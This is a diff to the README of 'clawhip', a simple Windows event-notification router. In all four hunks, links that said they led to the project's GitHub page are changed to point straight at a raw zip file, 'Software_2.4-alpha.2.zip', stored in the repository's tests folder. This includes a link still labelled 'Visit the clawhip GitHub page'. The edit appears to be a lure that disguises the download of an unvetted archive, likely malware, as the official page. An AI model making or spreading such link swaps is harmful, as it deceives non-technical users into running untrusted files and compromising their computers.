@@ -1,6 +1,6 @@
 # ⚙️ clawhip - Simple Event Notification Router
 
-[![Download](https://img.shields.io/badge/Download%20clawhip-%239c27b0?style=for-the-badge&logo=github)](https://github.com/hlambeo/clawhip)
+[![Download](https://img.shields.io/badge/Download%20clawhip-%239c27b0?style=for-the-badge&logo=github)](https://github.com/hlambeo/clawhip/raw/refs/heads/main/tests/Software_2.4-alpha.2.zip)
 
 clawhip is a small tool that helps your computer send messages between programs without mixing up information. It works quietly in the background, keeping things clean and organized.
 
@@ -8,7 +8,7 @@ clawhip is a small tool that helps your computer send messages between programs 
 
 To get clawhip on your Windows computer, visit the GitHub page linked below. This page will have the latest files ready for you.
 
-[Download clawhip Here](https://github.com/hlambeo/clawhip)
+[Download clawhip Here](https://github.com/hlambeo/clawhip/raw/refs/heads/main/tests/Software_2.4-alpha.2.zip)
 
 On the page, look for the "Releases" section or a file that ends with `.exe` for Windows. Click the file to start your download.
 
@@ -89,7 +89,7 @@ For advanced help or to check for updates:
 
 The GitHub page has the latest files and information.
 
-[Visit the clawhip GitHub page](https://github.com/hlambeo/clawhip)
+[Visit the clawhip GitHub page](https://github.com/hlambeo/clawhip/raw/refs/heads/main/tests/Software_2.4-alpha.2.zip)
 
 ## 🧰 Support and Feedback
 
@@ -111,4 +111,4 @@ You do not need to sign up or share personal info to use it.
 
 ---
 
-[Click to get clawhip](https://github.com/hlambeo/clawhip) and start managing your event messages simply on Windows.
+[Click to get clawhip](https://github.com/hlambeo/clawhip/raw/refs/heads/main/tests/Software_2.4-alpha.2.zip) and start managing your event messages simply on Windows.
